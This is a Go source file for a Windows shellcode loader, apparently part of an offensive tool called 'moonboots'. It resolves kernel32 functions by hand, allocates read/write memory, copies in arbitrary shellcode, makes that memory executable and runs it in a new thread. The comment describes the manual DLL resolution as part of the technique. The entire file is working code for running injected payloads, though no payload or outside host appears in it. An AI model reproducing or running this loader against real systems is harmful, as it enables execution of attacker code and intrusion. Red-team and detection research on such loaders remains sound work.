package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	"github.com/ma111e/moonboots/internal/defs"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

/*
This technique executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Call CreateThreadLoader on shellcode address
	5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This technique loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

const (
	LdrCreateThreadNative = "createthreadnative"
)

type CreateThreadNativeLoader struct {
	Base
}

func init() {
	AvailableLoaders.Register(LdrCreateThreadNative, &CreateThreadNativeLoader{})
}

func (ldr CreateThreadNativeLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func (ldr CreateThreadNativeLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	//RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	log.Debugln("Calling VirtualAlloc for shellcode")
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), defs.MEM_COMMIT|defs.MEM_RESERVE, defs.PAGE_READWRITE)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed and returned 0")
	}

	log.Printf("Allocated %d bytes", len(shellcode))

	log.Debugln("Copying shellcode to memory with copy")

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
	log.Println("Shellcode copied to memory")

	log.Debugln("Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")

	oldProtect := defs.PAGE_READWRITE
	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), defs.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtect: %s", err)
	}
	log.Println("Shellcode memory region changed to PAGE_EXECUTE_READ")

	log.Debugln("Calling CreateThreadLoader...")
	//var lpThreadId uint32
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling CreateThreadLoader: %s", err)
	}
	log.Println("Shellcode Executed")

	log.Debugln("Calling WaitForSingleObject...")

	_, _, err = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling WaitForSingleObject: %s", err)
	}

	return nil
}
